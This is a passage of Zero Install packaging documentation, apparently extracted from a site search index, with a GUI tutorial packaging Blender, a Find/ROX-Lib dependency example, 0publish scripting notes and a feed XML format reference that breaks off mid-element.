The description fields can be longer. Copying some text from the project's web page often works well. Set the homepage to the program's main web-site (or to your own site if you have a page for it). This is where users will go if they want more information than is in the description. Don't forget to uncomment it by removing the <!-- and --> markers around it. Set the icon to the URL of a small PNG format icon if you want. Set the feed-for element to the URL where you plan to host the XML feed file.

We will start by packaging Blender , an open source 3D modelling and animation program. You should already be familiar with the general operation of Zero Install. If not, start by reading the Introduction tutorial . We assume here that a binary release already exists (perhaps published by someone else) and you want to make it available through 0install. If you want to publish your own programs, you might also be interested in 0release , which generates a release from a Git repository. Tip To check whether someone has already packaged a program, use the 0install search command to search all known existing feeds. Tutorial \u00b6 To make a program available via Zero Install you need to create an XML 'feed' file, describing which versions are available, where they can be downloaded, and what other software they require. In this tutorial, we'll use the graphical 0publish-gui application to create this file. If you don't want to use a graphical interface (for example, because you want to publish new versions using a script) then you should read the command-line tutorial instead. Start by getting 0publish-gui in the usual way: $ 0install add 0publish-gui http://0install.net/2007/interfaces/0publish-gui.xml This program requires GTK >= 2.6 and Python >= 2.4 (these are not fetched using Zero Install at present). Note On Windows use 0publish-win instead. Run the program, giving it the name of the feed file you want to create, which should be named after the program: $ 0publish-gui Blender.xml A window appears prompting you to enter some details about the program. Here, I've copied the details from the project's freshmeat.net page. The Icon field is optional, but I've added one anyway: The next step is to add one or move versions of Blender to the feed, which we can do from the Versions tab using the Add Archive button: Enter the URL of the archive for the new version (copy the link from the Blender site). This URL tells other people where to get it, so it must be present. If you've already downloaded the archive then choose it in the Local copy section. Otherwise, click on Download to download it now: The top-level items in the archive are displayed in the Extract area. The reason for this is that there are two common ways of laying out archives. Some people put the files in the archive directly, while others create an extra top-level directory. In blender's case, the archive contains a single top-level directory called blender-2.42a-linux-glibc232-py24-i386-static . The reason this matters is because we need each version to have a similar structure. We don't want a directory name that's going to be different each time, so we select to extract just the contents of this directory. 0publish-gui is pretty smart about guessing whether to extract everything or just a sub-directory, so just go with the default. Now we are prompted to enter some extra information about this version. The most important field to set is Main , which is the executable program inside the archive that is run when someone tries to use your feed. The drop-down menu shows the available executables. The License and Released fields are just for information. Released is the date you added this version to the feed, so the default of today's date is correct. The OS and CPU fields prevent people from trying to use this version on incompatible machines. The Docs field can be used to say which directory contains the documentation, if any. I've left Stability set to (inherit) , which means that the rating will be inherited from any containing group. Since we don't have a group, it will get the default value of Testing . You can also inherit the other fields (by leaving them blank), although OS and CPU are inherited together (you can't inherit one and not the other). Groups are useful when you have lots of versions, so you don't have to keep specifying the same information for each one. Finally, the shaded ID field displays a cryptographic digest of the archive's contents. When other people use this feed to get Blender 2.42, this is how they know that they've downloaded exactly the same files as you have (in case an attacker replaces the download with a modified version). You'll now see your new version shown in the list of versions, along with the single archive, which says where to get it. The names in parenthesis show which attributes we set. We can try out the interface by clicking on the Save and Test button: This runs 0install run on our XML file, in the usual way. Note that version 2.42 is already cached; it was added when we clicked OK in the Add Archive box. Click on Execute and check that it runs. It all works perfectly, so we'll publish this feed on the web for other people to use. To do this, we need to sign the feed so people can check that it's really from us. Go to the Publishing tab and choose your GPG key from the menu. If you don't have a key, click on the Add button to create one now. When generating a key, you'll be asked a few difficult-looking questions; if unsure, just accept the defaults offered. Enter your name and e-mail address when prompted, and choose a good passphrase to protect the key: There's one final thing left to do: we need to decide where on the web we'll publish the XML file. Enter the URL that people will use to download your feed in the section titled This feed's URL . Try to pick a location that won't change, as people will keep coming back here for updates. Click on Save to save it again. This time, you'll be prompted to enter your key passphrase (the one you chose when creating the key above): The final result of all this is three files: the signed XML feed file itself, listing our single version, your GPG public key, which lets people check the signature, and an XSLT stylesheet, in case anyone wants to view the feed in their browser. Upload all three files to your web-server. I put mine in http://0install.net/2007/3rd-party/ . Now anyone can run Blender with the command: $ 0install run http://0install.net/2007/3rd-party/Blender.xml Check your feed! \u00b6 It's surprising how easy it is to forget to set the right permissions, etc, so check your new feed! FeedLint is an easy first step: $ 0install add feedlint http://0install.net/2007/interfaces/FeedLint.xml $ feedlint http://0install.net/2007/3rd-party/Blender.xml Groups and dependencies \u00b6 If the software depends on something else (e.g. a library) then use the Add Requires button to specify this. For example, 0publish-gui depends on ROX-Lib , which I specified like this: This ensures that .../ROX-Lib2/python is in PYTHONPATH . When 0publish-gui does import rox , the import thus uses the directory .../ROX-Lib2/python/rox . When you want to add more versions, you should use the Add Group button to create a group. Make sure both versions are inside the new group (use drag-and-drop to move them). Then you only need to set the license, main, OS and CPU settings in one place. You can also share dependencies using groups. Trouble-shooting \u00b6 I can't find a generic binary for the program I want to package! Popular projects usually provide a \"generic\" binary tarball, which works on most Linux distributions. This is the best archive to put in the feed. If there isn't one, it might mean that the developers couldn't get a single binary to work on multiple distributions, or it might just mean they haven't tried. Often, a Red Hat RPM will work just fine on Debian (e.g. the LyX feed ), or a .deb will work on Red Hat, etc. If there are several options, pick the one for the distribution which is furthest behind (e.g. Red Hat rather than Fedora). Packages for old systems often still work with newer ones, but not the other way around. My program assumes it's running from /usr/games . Games have an annoying habit of trying to cd to a hard-coded directory in their start-up script. You could try asking the author to fix it ( cd \"$(dirname $0)\" would work just as well). It's also possible to patch the download using a <recipe> element, but the GUI doesn't provide an interface for this. The trick here is getting the ID right; you need the digest of the directory structure after the patch has been applied. 0install digest can help here.

It's also possible to patch the download using a <recipe> element, but the GUI doesn't provide an interface for this. The trick here is getting the ID right; you need the digest of the directory structure after the patch has been applied. 0install digest can help here.","title":"Trouble-shooting"},{"location":"packaging/guide-gui/#further-reading","text":"Example: Find Find is a Python program with a dependency on a Python library.

When the user asked to run the program, the injector downloaded it for them and cached it. However, most programs depend on other programs, libraries and resources and these can also be fetched using the injector. Our example package will be Find , a little utility for searching for files which depends on the ROX-Lib Python library. Running Find directly \u00b6 Start by downloading Find-006 . This is just a normal application, not specially designed for the injector. If you try to run it, you should get an error: $ wget http://www.hayber.us/rox/find/Find-006.tgz $ tar xzf Find-006.tgz $ cd Find $ ./AppRun *** This program needs ROX-Lib2 ( version 2 .0.0 ) to run. Note If it runs without an error, then either you've installed ROX-Lib manually (not using the injector) or your PYTHONPATH already points to it. Creating the interface file \u00b6 Start by creating an XML interface file ( Find.xml ) as we did before: $ 0publish Find.xml Fill in the fields as before. The only difference is the addition of the requires element, which states that this program requires ROX-Lib , and the main attribute which is now AppRun . The final result should look something like this: <?xml version=\"1.0\" ?> <?xml-stylesheet type='text/xsl' href='http://0install.net/2006/stylesheets/interface.xsl'?> <interface xmlns= \"http://zero-install.sourceforge.net/2004/injector/interface\" > <name> Find </name> <summary> a find-in-files utility </summary> <description> Searches files for specific text, displaying the results in a window. Double click on the result line(s) to open the file at that point. Configuration options are available to customize the search command and the editor with which to open the files. </description> <homepage> http://www.hayber.us/rox/Find </homepage> <icon type= 'image/png' href= 'http://www.hayber.us/0install/Find.png' /> <group main= 'AppRun' > <requires interface= \"http://rox.sourceforge.net/2005/interfaces/ROX-Lib\" > <environment insert= \"ROX-Lib2/python\" name= \"PYTHONPATH\" /> </requires> <implementation id= '.' version= '6' /> </group> Let's go over the group part in detail: The <group> element contains a set of implementations of the interface (versions of Find ) and their requirements. The group saves us having to repeat the requirements for each implementation (since they often don't change). We have also given the main attribute here, since all versions of Find are run using a script with this name. We have a single requirement, ROX-Lib, which is identified by the URI of its interface. The URI is chosen by the publisher of the ROX-Lib interface, just as we chose the URI for our SCons interface in the previous tutorial. The <environment> element inside tells the injector how to make its choice known to Find . In this case, it is by inserting /path/of/cache/DIGEST/ROX-Lib2/python to the beginning of the PYTHONPATH environment variable. When Find (a Python program) does import rox , it will then get the chosen version of ROX-Lib . Also inside the group we have a single (local) implementation, as before. The id gives the location of the implementation directory relative to the interface file. In this case, we are assuming that the Find.xml file is in the same directory as the AppRun script. Save the interface using the default file name (a temporary file chosen by 0publish ) and try running it: $ 0install run ./Find.xml If you don't already have ROX-Lib, you will be prompted to download it as usual. Once ROX-Lib is available, Find runs: As usual, you can run 0install run -g ./Find.xml to force the 0install GUI to appear. You will see that there is a single version of Find available, but that you can choose any version of ROX-Lib to use with it. Adding the archive \u00b6 We will now change the implementation as we did before so that the injector will download Find for us instead of requiring it to be on the machine already: $ 0publish Find.xml \\ --set-version = 6 \\ --set-released = today \\ --archive-url = http://www.hayber.us/rox/find/Find-006.tgz \\ --archive-file = ../Find-006.tgz \\ --archive-extract = Find As the archive file isn't in the current directory, we give its location with --archive-file . 0publish needs this to get the digest, but it doesn't download the archive from the network because it wouldn't be able to check that it hasn't been tampered with (although if the program's author doesn't provide a signature then there may be no way to check anyway). We also use the --archive-extract attribute. This is because each Find archive contains a single top-level directory, which we don't need (and the name might change in different versions, e.g. if the author decides to include the version number). Extracting just the contents means the every version will have the same structure, which makes it easier for other programs to depend on it. This is mostly useful for libraries like ROX-Lib, where we need to know that the path will always be lib , not libfoo-1.1/lib with version 1.1 and libfoo-1.2/lib with version 1.2, since a fixed path has to go in the environment element above. The resulting file will contain this: <implementation id= 'sha1=ff9d9e11fde0a146c7e1781511fd9afb17752e34' released= \"2006-05-19\" version= '6' > <archive href= \"http://www.hayber.us/rox/find/Find-006.tgz\" size= \"23161\" extract= 'Find' /> </implementation> The attributes of <archive> are: href a URL from which the archive can be downloaded (in escaped form, so a space is written as %20, etc). size the size of the archive (for progress bars). extract (optional) a subdirectory of the archive to use. We could have omitted this and changed the implementation's main to Find/AppRun instead, but it's better to keep the main attribute the same, if possible. If you run the new Find.xml , the injector should download and unpack the archive into the cache, and run Find from it. Note on weaknesses in SHA-1 \u00b6 Some weaknesses in the SHA-1 algorithm have been discovered. At present, it is still strong enough for our use, but you may wish to use some other algorithm, with the --manifest-algorithm option. See the specification for a list of available secure hashing algorithms and which versions of the injector support them. See the HASH COLLISION Q&A for more details. Publishing the interface \u00b6 The Find.xml interface file can now be signed and published as described before: $ 0publish Find.xml --set-interface-uri = http://www.hayber.us/0install/Find $ 0publish Find.xml --xmlsign Registering the local feed \u00b6 We have already seen how to use a local Find.xml file inside the Find directory to run the local version with a chosen version of ROX-Lib (i.e., by setting the id attribute to . ). It is quite useful to add this file to your CVS (or similar system) to let developers test new versions easily, since it will get the libraries for them. In fact, we'd often like to see both downloadable implementations (e.g., official releases) and local versions (e.g., developer CVS checkouts) of Find together. To do this, all we need is to add a feed-for line in the local Find/Find.xml file (the one where the implementation id is . ): <?xml version=\"1.0\" ?> <interface xmlns= \"http://zero-install.sourceforge.net/2004/injector/interface\" > <feed-for interface= 'http://www.hayber.us/0install/Find' /> You can now register the local feed in the normal way: $ 0install add-feed Find.xml When another program runs Find using its official URI, this local version will be included in the list of available versions that can be selected. It is traditional to add .0 to the end of the version number for CVS versions, so that the CVS version will be preferred to the previous release. Problems with manifest digests \u00b6 There is one possible problem with the digests, where the 'actual' manifest changes each time the archive is extracted! This happens when you include only some deep subdirectories in the archive, but not the top-level directory. Eg: $ tar czf archive.tgz deeply/nested/path When tar extracts the archive, it restores the original mtime of 'path', but creates 'deeply' and 'nested' with the current time. This is what causes the digest to change. There are two possible solutions: Always list all top-level directories when creating archives. Use any algorithm except sha1 , as this is the only one that includes directory mtimes in the digest (for backwards compatibility).","title":"Find"},{"location":"packaging/examples/find/#find","text":"In the main packaging guide (which should be read before this one) we saw how to make a simple Python program available.

The system won't periodically check for updates. These limitations can be avoided by creating a Zero Install interface file for it. This guide goes over the steps quite quickly. For more details see the packaging main guide .

This guide assumes you've already read the packaging guide , which explains how to create and publish interface files. We won't explain all the concepts in detail again, we'll just show how to script the steps. General operation \u00b6 0publish edits interface files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again.

Delete the debugging symbols and the build and src directories to save space: $ rm -r ROX-Filer/ { ROX-Filer.dbg,build,src } 4. The ROX-Filer source download includes a local interface file called ROX-Filer.xml . This allows people to register local versions using 0install add-feed . Set the release date and architecture in it: $ 0publish --set-released 2006 -02-26 ROX-Filer.xml $ 0publish --set-arch Linux-ppc64 ROX-Filer.xml You can also edit it to change the name and description if you want.

Adding the archive to the interface \u00b6 To make our new binary available through Zero Install: 1. Take a copy of the local interface from the archive.

The extract value is used as the <archive> 's extract attribute and must match the name of the top-level directory in the archive.

An interface describes a program, library or other component. A feed provides a list of known implementations of the interface (versions of the program) and details about how to get them, how to check that they are authentic, how to run them and what other components they depend on. This class diagram shows how the different concepts are related. Each feed file contributes information to this model: Each Feed lists a number of Implementations (versions). An Identity is a way to recognise an Implementation (e.g. a cryptographic digest). A Retrieval method is a way to get an Implementation (e.g. by downloading from a web site). A Command says how to run an Implementation as a program. A Dependency indicates that one component depends on another (e.g. Gimp requires the GTK library). A Binding says how to let the program locate the Implementations when run. A Constraint limits the choice of a dependency (e.g. Gimp requires a version of GTK >= 2.6). Terminology Originally the word 'interface' was used to mean both 'interface' and 'feed', so don't be confused if you see it used this way. XSD schema Introduction \u00b6 Feed files are introduced in the Packager's Documentation . They have the following syntax ( ? follows optional items, * means zero-or-more, order of elements is not important, and extension elements can appear anywhere as long as they use a different namespace): <?xml version='1.0'?> <interface xmlns= 'http://zero-install.sourceforge.net/2004/injector/interface' min-injector-version= '...' ? uri= '...' ? > <name> ... </name> <summary> ... </summary> <description> ... </description> ? <homepage> ... </homepage> ? <category type= '...' ? > ... </category> * <needs-terminal/> ? <icon type= '...' href= '...' /> * <feed src= '../img/...' langs= '...' ? arch= '...' ? /> * <feed-for interface= '...' /> * <replaced-by interface= '...' /> ? [group] * [implementation] * [entry-point] * </interface> min-injector-version This attribute gives the oldest version of 0install that can read this file. Older versions will tell the user to upgrade if they are asked to read the file. Versions prior to 0.20 do not perform this check, however. If the attribute is not present, the file can be read by all versions. uri This attribute is only needed for remote feeds (fetched via HTTP). The value must exactly match the expected URL, to prevent an attacker replacing one correctly-signed feed with another (e.g., returning a feed for the shred program when the user asked for the backup program). <name> a short name to identify the interface (e.g. \"Foo\") <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long (optional since 0.32, but recommended) <homepage> the URL of a web-page describing this interface in more detail <category> a classification for the interface. If no type is given, then the category is one of the 'Main' categories defined by the freedesktop.org menu specification . Otherwise, it is a URI giving the namespace for the category. <needs-terminal> if present, this element indicates that the program requires a terminal in order to run. Graphical launchers should therefore run this program in a suitable terminal emulator. <icon> an icon to use for the program; this is used by programs such as AddApp and desktop integration . You should provide an icon of the type image/png ( .png ) for display in browsers and launchers on Linux. For Windows apps you should additionally provide an icon of the type image/vnd.microsoft.icon ( .ico ). <feed> the linked feed contains more implementations of this feed's interface. The langs and arch attributes, if present, indicate that all implementations will fall within these limits (e.g. arch='*-src' means that there is no point fetching this feed unless you are looking for source code). See the <implementation> element for a description of the values of these attributes. <feed-for> the implementations in this feed are implementations of the given interface. This is used when adding an optional extra feed to an interface with 0install add-feed (e.g. a local feed for a development version). <replaced-by> this feed's interface (the one in the root element's uri attribute) has been replaced by the given interface. Any references to the old URI should be updated to use the new one. Groups \u00b6 A group has this syntax: <group version= '...' ? released= '...' ? main= '...' ? self-test= '...' ? doc-dir= '...' ? license= '...' ? released= '...' ? stability= '...' ? langs= '...' ? arch= '...' ? > [requires] * [group] * [command] * [binding] * [implementation] * [package-implementation] * </group> All attributes of the group are inherited by any child groups and implementations as defaults, but can be overridden there. All dependencies ( requires ), bindings and commands are inherited (sub-groups may add more dependencies and bindings to the list, but cannot remove anything). Implementations \u00b6 An implementation has this syntax (an unspecified argument is inherited from the closest ancestor <group> which defines it): <implementation id= '...' local-path= '...' ? [all <group > attributes] > <manifest-digest [digest] * /> * [command] * [retrieval-method] * [binding] * [requires] * </implementation> id A unique identifier for this implementation. For example, when the user marks a particular version as buggy this identifier is used to keep track of it, and saving and restoring selections uses it. However, see the important historical note below . local-path If the feed file is a local file (the interface uri starts with / ) then the local-path attribute may contain the pathname of a local directory (either an absolute path or a path relative to the directory containing the feed file). See the historical note below. version The version number. See the version numbers section below for more details. main (deprecated) The relative path of an executable inside the implementation that should be executed by default when the interface is run. If an implementation has no main setting, then it cannot be executed without specifying one manually (with 0install run --main=MAIN ). This typically means that the interface is for a library. Note: main is being replaced by the <command> element. self-test (deprecated) The relative path of an executable inside the implementation that can be executed to test the program. The program must be non-interactive (e.g. it can't open any windows or prompt for input). It should return with an exit status of zero if the tests pass. Any other status indicates failure. Note: self-test is being replaced by the <command> element. doc-dir The relative path of a directory inside the implementation that contains the package's documentation. This is the directory that would end up inside /usr/share/doc on a traditional Linux system. released The date this implementation was made available, in the format YYYY-MM-DD . For development versions checked out from version control this attribute should not be present. stability The default stability rating for this implementation. If not present, testing is used. See the stability section below for more details. langs The natural language(s) which this package supports, as a space-separated list of languages codes (in the same format as used by the $LANG environment variable). For example, the value en_GB fr would be used for a package supporting British English and French. Supported since 0.48. Note that versions before 0.54 require the region separator to be _ (underscore), while later versions also allow the use of - for consistency with the xml:lang format. arch For platform-specific binaries, the platform for which this implementation was compiled, in the form os-cpu . 0install knows that certain platforms are backwards-compatible with others, so binaries with arch=\"Linux-i486\" will still be available on Linux-i686 machines, for example. Either the os or cpu part may be * , which will make it available on any OS or CPU. If missing, the default is *-* . See also: Valid architecture names . license License terms. This is typically a Trove category. See the PyPI list for some examples (the leading License :: is not included). The manifest-digest element is used to give digests of the .manifest file using various hashing algorithms (but see the historical note below). Having multiple algorithms allows a smooth upgrade to newer digest algorithms without breaking old clients. Each non-namespaced attribute gives a digest, with the attribute name being the algorithm. Example <manifest-digest sha256= \"4f078f9080bd9b3b87e8360f014268886ec653ed077bb3cb6725185c0a07473a\" /> For non-local implementations (those without a local-path attribute), the <implementation> element contains a set of retrieval methods , each of which gives a different way of getting the implementation (i.e. of getting a directory structure whose digest matches the ones given). Currently, 0install always chooses the first of the methods it understands, but in future it may use other strategies (such as choosing the closest mirror, or letting the user select one manually). It may also use other methods which aren't listed, such as searching for the implementation on a peer-to-peer network. Unrecognised elements inside an implementation are ignored. Historical note about id \u00b6 0install >= 0.45 generally treats the ID as a simple identifier, and gets the local path (if any) from the local-path attribute and the digests from the <manifest-digest> . 0install < 0.45 ignores the local-path attribute and the <manifest-digest> element. If the ID starts with . or / then the ID is also the local path; otherwise, it is the single manifest digest. For backwards compatibility, 0install >= 0.45 will treat an ID starting with . or / as a local path if no local-path attribute is present, and it will treat it as an additional digest if it contains an = character. Therefore, if you want to generate feeds compatible with past and future versions: If you have a digest, set the ID to sha1new=... and put the sha256 digest in the <manifest-digest> . If you have a local implementation then set both id and local-path to the pathname. Commands \u00b6 The main attribute above provides a simple way to say how to run this implementation. The <command> element (supported since 0.51, released Dec 2010) provides a more flexible alternative. <command name= '...' path= '...' ? > [binding] * [requires] * [runner] ? <arg> ... </arg> * <for-each item-from= '...' separator= '...' ? > ... </for-each> * </command> name By default, 0install executes the run command, but the --command option can be used to specify a different one. 0test runs the test command (replacing the old self-test attribute) and 0compile runs the compile command (replacing the compile:command attribute). path The relative path of the executable within the implementation (optional if <runner> is used). Additional arguments can be passed using the <arg> element. Within an argument, ${name} is expanded to the value of the corresponding environment variable. These arguments are passed to the program before any arguments specified by the user. If an environment variable should be expanded to multiple arguments, use <for-each> . The variable in the item-from attribute is split using the given separator (which defaults to the OS path separator, : on POSIX and ; on Windows) and the arguments inside the element are added for each item. The current item is available as ${item} . If the variable given in item-from is not set or is empty, no arguments are added. See below for an example. Versions of 0install before 1.15 ignore <for-each> elements and their contents. Command-specific dependencies can be specified for a command by nesting <requires> elements. For example, an interpreter might only depend on libreadline when used interactively, but not when used as a library, or the test command might depend on a test framework. Command-specific bindings (0install >= 1.3) create a binding from the implementation to itself. For example, the test command may want to make the run command available in $PATH using <executable-in-path> . The <runner> element introduces a special kind of dependency: the program that is used to run this one. For example, a Python program might specify Python as its runner. <runner> is a subclass of <requires> and accepts the same attributes and child elements. In addition, you can specify arguments to pass to the runner by nesting them inside the <runner> element. These arguments are passed before the path of the executable given by the path attribute. Example <command name= 'run' path= \"causeway.e-swt\" > <runner interface= 'http://repo.roscidus.com/e/e-core' > <arg> -cpa </arg> <arg> $SWT_JAR </arg> <for-each item-from= \"EXTRA_E_OPTIONS\" separator= \" \" > <arg> ${item} </arg> </for-each> </runner> </command> In this case, 0install will run the equivalent of /path/to/e-interpreter -cpa /path/to/swt.jar $EXTRA_E_OPTIONS /path/to/causeway.e-swt . Package implementations \u00b6 This element names a distribution-provided package which, if present, is a valid implementation of this interface. The syntax is: <package-implementation package= '...' distributions= '...' ? main= '...' ? version= '...' ? > [command] * [requires] * </package-implementation> Support for distribution packages was added in version 0.28 of 0install. Earlier versions ignore this element. If the named package is available then it will be considered as a possible implementation of the interface. If main is given then it must be an absolute path. If the distributions attribute is present then it is a space-separated list of distribution names where this element applies. 0install >= 0.45 ranks the <package-implementation> elements according to how well they match the host distribution and then only uses the best match (or matches, if several get the same score). See Distribution integration for a list of supported distributions. Earlier versions of 0install ignore the distributions attribute and process all of the elements. Note that, unlike a normal implementation, a distribution package does not resolve to a directory. Any bindings inside <requires> elements for the interface will be ignored; it is assumed that the requiring component knows how to use the packaged version without further help. Therefore, adding distribution packages to your interface considerably weakens the guarantees you are making about what the requester may get. Package implementations still inherit attributes and dependencies from their parent group. The doc-dir and license attributes may be given, but version and released are read from the native packaging system. If version is given then only implmentations matching this pattern are used (0install >= 2.14). This allows multiple <packages-implmentation> elements for a single distribution package, which is useful if different versions have different requirements. See Constraints for the syntax. Retrieval methods \u00b6 A retrieval method is a way of getting an implementation. The most common retrieval method is the <archive> element: <archive href= '...' size= '...' extract= '...' ? dest= '...' ? type= '...' ? start-offset= '...' ? /> This states that an archive may be downloaded from the address given in the href attribute. The archive must have the given size or it will be rejected. When unpacked (either the subdirectory named in the extract attribute, or the whole archive if it is not present), the resulting tree will generate a manifest with the secure hash value given as the implementation's id . If dest is given (0install >= 2.1), then the archive is unpacked to the specified subdirectory. It is an error to specify a target outside of the implementation directory (e.g. ../foo or attempting to follow a symlink that points out of the implementation). Note that the extract attribute cannot contain / or \\ characters, so it can only be used to extract a top-level directory. It is intended for archives that contain their own name as the single top-level entry. The type of the archive is given as a MIME type in the type attribute (since 0install version 0.21). If missing, the type is guessed from the extension on the href attribute (all versions). Known types and extensions (case insensitive) are: application/zip ( .zip ) application/x-tar ( .tar ) application/x-compressed-tar ( .tar.gz or .tgz ) application/x-bzip-compressed-tar ( .tar.bz2 or .tbz2 ) application/x-xz-compressed-tar ( .tar.xz or .txz ) - since version 0.43, since version 2.11 on Windows application/x-lzma-compressed-tar ( .tar.lzma or .tlzma ) application/x-lzip-compressed-tar ( .tar.lz or .tlz ) - since version 2.18, Windows only application/x-zstd-compressed-tar ( .tar.zst ) - since version 2.18, Windows only application/x-ruby-gem ( .gem ) - since version 1.0-rc1 application/x-7z-compressed ( .7z ) - Windows only application/vnd.rar ( .rar ) - since version 2.18, Windows only application/vnd.ms-cab-compressed ( .cab ) application/x-msi ( .msi ) - Windows only application/x-deb ( .deb ) - not supported on Windows application/x-rpm ( .rpm ) - not supported on Windows application/x-apple-diskimage ( .dmg ) - not supported on Windows The start-offset attribute (since version 0.21) gives the number of bytes at the beginning of the file which should be ignored. This is useful for some self-extracting archives which are made up of a shell script followed by a normal archive in a single file. If missing, it defaults to 0. The value in the size attribute does not include the skipped bytes. You can also fetch individual files (0install >= 2.1). This is useful for e.g. jar files, which are typically not unpacked: <file href= '...' size= '...' dest= '...' executable= 'true|false' ? /> The file is downloaded from href , must be of the given size , and is placed within the implementation directory as dest . If executable is set to true (0install >= 2.14.2) the file is marked as executable after download. Recipes \u00b6 An implementation can also be created by following a <recipe> : <recipe> ( <archive ... > | <file ... > | <rename ... > | <remove ... > | <copy-from ... > ) + </recipe> In this case, each child element of the recipe represents a step. To get an implementation by following a recipe, a new empty directory is created and then all of the steps are performed in sequence. The resulting directory must have the digest given in the implementation's <manifest-digest> . A recipe containing only a single archive is equivalent to just specifying the archive on its own. If a recipe contains an unrecognised element then the whole recipe must be ignored. <archive ...> Causes the named archive to be fetched and unpacked over the top of whatever is currently in the temporary directory. It supports the same attributes as when used outside of a recipe. <file ...> Causes the named file to be fetched and saved over the top of whatever is currently in the temporary directory (0install >= 2.1). It supports the same attributes as when used outside of a recipe. <rename source='...' dest='...'> Renames or moves a file or directory (0install >= 1.10). It is an error if the source or destination are outside the implementation. <remove path='...'> Delete the file or directory from the implementation (0install >= 2.1). It is an error if the path is outside the implementation. <copy-from id='...' source='...' ? dest='...' ?> Copies files or directories from another implementation, e.g., for applying an update to a previous version (0install >= 2.13). The specified id must exactly match the id attribute of another implementation specified elsewhere in the same feed. You can specify the source and destination file or directory to be copied relative to the implementation root. Leave them unset to copy the entire implementation. Tip A recipe is generally only useful for patching existing archives without having to host the complete result yourself. Normally, if your program requires files from several different packages then it is better to use the <requires> element instead. This allows libraries to be shared between different programs, and lets the user choose the versions and upgrade them individually. Dependencies \u00b6 A <requires> element means that every implementation within the same group (including nested sub-groups) requires an implementation of the specified interface when run. 0install will choose a suitable implementation, downloading one if required. <requires interface= '...' importance= '...' ? version= '...' ? os= '...' ? distribution= '...' ? source= 'true|false' ? use= '...' ? > [ constraints ] * [ bindings ] * </requires> The constraint elements (if any) limit the set of acceptable versions. The bindings specify how 0install should make its choice known (typically, by setting environment variables). The use attribute can be used to indicate that this dependency is only needed in some cases. By default, 0install >= 0.43 will skip any <requires> element with this attribute set. Earlier versions process all <requires> elements whether this attribute is present or not. 0test >= 0.2 will process dependencies where use=\"testing\" , in addition to the program's normal dependencies. This attribute is deprecated - it's usually better to use a <command> for this. The importance attribute (0install >= 1.1) can be either essential (the default; a version of this dependency must be selected) or recommended (no version is also an option, although selecting a version is preferable to not selecting one). The version attribute (0install >= 1.13) provides a quick way to specify the permitted versions. See the Constraints section below. The distribution attribute (0install >= 1.15) can be used to require the selected implementation to be from the given distribution. For example, a Python library available through MacPorts can only be used with a version of Python which is also from MacPorts. The value of this attribute is a space-separated list of distribution names. In addition to the official list of distribution names , the special value 0install may be used to require an implementation provided by 0instal (i.e. one not provided by a <package-implementation> ). The os attribute (0install >= 1.12) can be used to indicate that the dependency only applies to the given OS (e.g. os=\"Windows\" for dependencies only needed on Windows systems). The source attribute (0install >= 2.8) can be used to indicate that a source implementation is needed rather than a binary. This may be useful if you want to get e.g. header files from a source package. Note that if you select both source and binary implementations of an interface, 0install does not automatically force them to be the same version. A <restricts> element (0install >= 1.10) can be used to apply constraints without creating a dependency: <restricts interface= '...' version= '...' ? os= '...' ? distribution= '...' ? > [ constraints ] * </restricts> Internally, <restricts> behaves much like <requires importance='recommended'> , except that it doesn't try to cause the interface to be selected at all. Constraints \u00b6 Constraints appear on <requires> , <restricts> , <package-implementation> and <runner> elements. They restrict the set of versions from which 0install may choose an implementation. Since 0install 1.13, you can use the version attribute on the dependency element. The attribute's value is a list of ranges, separated by | , any of which may match. Example <restricts interface= 'https://apps.0install.net/python/python.xml' version= '2.6..!3 | 3.2.2..' /> This allows Python versions 2.6, 2.7 and 3.3, but not 2.5 or 3. Each range is in the form START..!END . The range matches versions where START <= VERSION < END . The start or end may be omitted. A single version number may be used instead of a range to match only that version, or !VERSION to match everything except that version. There is also an older syntax which also works with 0install < 1.13, where a child node is used instead: <version not-before= '...' ? before= '...' ? > not-before This is the lowest-numbered version that can be chosen. before This version and all later versions are unsuitable. For example, <version not-before='2.4' before='2.6'> allows any of these versions: 2.4, 2.4.0, and 2.4.8. It will not select 2.3.9 or 2.6. This older syntax is not supported with <packager-implementation> . Bindings \u00b6 Bindings specify how the chosen implementation is made known to the running program. Bindings can appear in a <requires> element, in which case they tell a component how to find its dependency, or in an <implementation> (or group), where they tell a component how to find itself. Environment bindings \u00b6 <environment name= '...' ( insert= '...' | value= '...' ) mode= 'prepend|append|replace' ? separator= '...' ? default= '...' ? /> * Details of the chosen implementation are passed to the program by setting environment variables, as specified by the <environment> elements (typically, there will be exactly one of these in each <requires> element). Each environment element gives the name of the variable and the relative path of the item within the implementation to insert into the variable's value. Usually, the (badly-named) insert attribute is used, which adds a path to a file or directory inside the implementation to the environment variable. For example, <environment name='PATH' insert='bin'/> would perform something similar to the bash shell statement export PATH=/path/to/impl/bin:$PATH . Alternatively, you can use the value attribute to use a literal string. For example, <environment name='GRAPHICAL_MODE' value='TRUE' mode='replace'/> . This requires 0install >= 0.52. If mode is prepend (or not set), then the absolute path of the item is prepended to the current value of the variable. The default separator character is the colon character on POSIX systems, and semi-colon on Windows. This can be overridden using separator (0install >= 1.1). If the environment variable is not currently set then the path is prepended to the value of the default attribute. If no default value is given either then the default for that environment variable is used, or the environment variable's value is set to the absolute path directly if there is no default. If mode is append then the same thing happens, except that the new value is added at the end instead of the beginning. If the mode is replace then the old value is overwritten, and the default attribute is ignored. The following environment variables have known defaults and therefore the default attribute is not needed with them: Name Default PATH /bin:/usr/bin XDG_CONFIG_DIRS /etc/xdg XDG_DATA_DIRS /usr/local/share:/usr/share Executable bindings \u00b6 These both require 0install >= 1.2. <executable-in-var name= '...' command= '...' ? /> <executable-in-path name= '...' command= '...' ? /> These are used when the program needs to run another program. command says which of the program's commands to use; the default is run . <executable-in-var> stores the path of the selected executable in the named environment variable. Example If a program uses $MAKE to run make, you can provide the required command like this: <requires interface= \"https://apps.0install.net/devel/make.xml\" > <executable-in-var name= 'MAKE' /> </requires> <executable-in-path> works in a similar way, except that it adds a directory containing the executable to $PATH . Example If the program instead just runs the make command, you would use: <requires interface= \"https://apps.0install.net/devel/make.xml\" > <executable-in-path name= 'make' /> </requires> It is preferable to use <executable-in-var> where possible, to avoid making $PATH very long. Implementation note On POSIX systems, 0install will create a shell script under ~/.cache/0install.net/injector/executables and pass the path of this script. Generic bindings \u00b6 Custom bindings can be specified using the <binding> element (0install >= 2.1). 0install will not know how to run a program using custom bindings itself, but it will include them in any selections documents it creates, which can then be executed by your custom code. The syntax is: <binding 